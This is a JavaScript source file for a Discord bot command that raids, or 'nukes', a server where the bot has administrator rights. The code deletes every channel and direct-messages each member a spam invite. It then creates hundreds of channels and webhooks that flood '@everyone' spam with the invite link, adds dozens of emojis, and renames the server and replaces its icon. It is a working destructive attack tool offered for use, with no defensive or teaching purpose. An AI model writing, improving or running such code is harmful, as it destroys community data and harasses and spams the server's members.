const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const Guilds = require("../../models/guilds")
const dayjs = require('dayjs')
const { error, hershell, success } = require("../lib/util");
const member = require("../../models/member");
module.exports = {
  name: "idauto",
  description: "asd",
  auth: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    let id = await client.guilds.cache.get(args[0])
    if(!id) return error(message, "I'm not on that server!")

    let guildPriv = await Guilds.findOne({ guildId: id })
    if(guildPriv) return error(message, 'That server is one of the servers privated!')

    if(!id.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")
    

    if(id.channels.cache.size < 498) {
        id.channels.cache.forEach(channel => channel.delete());
        id.members.cache.forEach(member => { 
          if(member.user.bot) return;
          member.send("discord.gg/peru").catch((e => console.log(`${e.message} - ${member.id}`)))
      })

        for (let i = 0;i < 499;i++) {
            id.channels.create({
                name: 'Shabby'
            }).then(c => {
              c.createWebhook({
                name: "Shabz",
                avatar: "https://media.discordapp.net/attachments/894697673150595113/906129601334509588/images_14.jpeg",
              }).then(m => {
                for (let i = 0;i < 25;i++) {
                  m.send("@everyone discord.gg/peru")
                }
              })
                for (let i = 0;i < 25;i++) {
                c.send("@everyone fcked by shabby discord.gg/peru")
              }
            })
            } 
        for (let i = 0;i < 50;i++) {
            id.emojis.create({
                attachment: "https://cdn.discordapp.com/emojis/1094283156527521853.gif?v=1",
                name: 'Shabby'
            });
        }
    
        await id.setName("#Shabby")
        await id.setIcon("https://cdn.discordapp.com/icons/1093539713123623033/e48b069cad5cb7c58bd13f7abd531948.png?size=2048")
    }

  },
};